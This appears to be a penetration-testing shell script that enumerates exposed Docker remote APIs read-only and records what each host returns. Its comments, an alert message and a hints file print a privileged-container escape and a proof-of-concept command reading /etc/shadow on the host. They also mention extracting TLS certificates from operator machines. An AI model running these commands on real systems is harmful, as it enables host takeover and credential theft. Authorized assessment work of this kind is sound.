#!/usr/bin/env bash
# enum-docker.sh — Docker remote API enumeration.
#
# *** CRITICAL FINDING ***
# Unauth Docker API on 2375 is direct host-equivalent RCE. The attacker can
# `docker run -v /:/mnt --privileged alpine` to read/write the host filesystem
# and pivot trivially. Any positive finding here should be escalated immediately.
#
# 2376 is the TLS-authenticated port; expect mutual-TLS. We probe but tolerate
# the cert rejection without raising it.
#
# Phases (all READ-ONLY — never invokes `docker run` or any container action):
#   1. /version + /info — banner + engine fingerprint
#   2. /containers/json — running containers (image, names, mounts)
#   3. /images/json — image inventory (private images often leak source paths)
#   4. /networks + /volumes — network and volume names (sensitive name hints)
#   5. /_ping latency (sanity)

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "docker: $(wc -l < "$TARGETS") targets -> $OUT"

if ! have curl; then
    miss "curl not installed — docker dispatcher cannot probe"
    exit 0
fi

while read -r target; do
    [ -z "$target" ] && continue
    read -r ip port <<< "$(split_ipport "$target")"
    h="$ip"; [[ "$ip" == *:* ]] && h="[$ip]"
    out_dir="$OUT/${ip}_${port}"; mkdir -p "$out_dir"

    # 2376 = TLS-required; 2375 = plaintext API (the dangerous one)
    scheme="http"
    [ "$port" = "2376" ] && scheme="https"
    base="${scheme}://${h}:${port}"

    # ---------- /version + /info ----------
    code=$(curl -ksI --connect-timeout 5 --max-time 10 \
                -o /dev/null -w '%{http_code}' "$base/version" 2>/dev/null)
    [ "$code" = "000" ] && continue

    curl -ks --connect-timeout 5 --max-time 10 "$base/version" \
        > "$out_dir/version.json" 2>/dev/null || true
    curl -ks --connect-timeout 5 --max-time 10 "$base/info" \
        > "$out_dir/info.json" 2>/dev/null || true
    curl -ks --connect-timeout 5 --max-time 10 "$base/_ping" \
        > "$out_dir/ping.txt" 2>/dev/null || true

    # If 200 on /version, this is a Docker daemon
    if [ "$code" = "200" ] && grep -q 'Docker\|Version' "$out_dir/version.json" 2>/dev/null; then
        if [ "$port" = "2375" ]; then
            err "CRITICAL: UNAUTH Docker daemon at $base — host-equivalent RCE via 'docker -H $base run -v /:/mnt --privileged alpine'"
        else
            hit "Docker daemon reachable at $base (TLS port — may require client cert)"
        fi

        # ---------- containers, images, networks, volumes ----------
        for ep in "containers/json?all=1" "images/json" "networks" "volumes"; do
            safe=$(echo "$ep" | sed 's|[/?&=]|_|g')
            curl -ks --connect-timeout 5 --max-time 15 "$base/$ep" \
                > "$out_dir/${safe}.json" 2>/dev/null || true
        done

        # Quick summary
        python3 -c "
import json, glob, os
d = '$out_dir'
def cnt(f):
    try:
        x = json.load(open(os.path.join(d, f)))
        return len(x) if isinstance(x, list) else len(x.get('Volumes') or [])
    except Exception: return '?'
print(f\"containers={cnt('containers_json_all_1.json')} images={cnt('images_json.json')} networks={cnt('networks.json')} volumes={cnt('volumes.json')}\")
" > "$out_dir/_summary.txt" 2>/dev/null || true
    elif [ "$code" = "403" ] || [ "$code" = "401" ]; then
        log "  $base: API requires auth (HTTP $code) — TLS mutual-auth or socket-perm restricted"
    fi
done < "$TARGETS"

cat > "$OUT/_hints.txt" <<'EOF'
Docker remote API findings:
  * 2375 unauth -> CRITICAL. PoC (do NOT run without explicit authorization):
      docker -H tcp://<ip>:2375 run --rm -v /:/mnt --privileged \
        alpine chroot /mnt sh -c 'id; cat /etc/shadow | head -3'
  * Even a 2375 that only returns /version on unauth still warrants escalation;
    some configs whitelist /version but the full API is on a UNIX socket reachable
    via volume mount from a privileged container the operator may already have.
  * 2376 with mutual-TLS — extract cert/key from operator desktop or CI pipeline
    if those endpoints are in scope. Otherwise out-of-band.
  * Containers with sensitive mounts (e.g. /var/run/docker.sock mounted -> docker
    socket escape from inside the container).
EOF

log "docker dispatcher done."
